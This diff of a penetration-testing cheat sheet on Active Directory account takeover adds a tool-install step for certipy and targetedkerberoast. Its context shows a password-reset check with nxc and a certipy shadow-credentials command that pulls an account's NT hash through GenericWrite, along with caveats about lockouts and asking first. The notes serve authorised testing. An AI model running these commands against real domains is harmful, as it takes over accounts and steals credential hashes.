@@ -21,6 +21,7 @@ nxc smb <DCIP> -u '<TargetUser>' -p 'Pwned123!'
 - [ ] The real user is locked out by this: on a real test, ask first, and prefer shadow credentials
 
 ## Shadow credentials, with GenericWrite
+At the pwn-broker prompt first: tool install certipy, and tool install targetedkerberoast for the roast below.
 The account's NT hash, with no reset and no cracking. certipy adds a key, logs in with it, and takes it off again.
 certipy shadow auto -u '<Username>@<Domain>' -p '<Password>' -dc-ip <DCIP> -account '<TargetUser>'
 - [ ] Needs a DC on Server 2016 or later with a certificate for PKINIT, so a CA in the domain
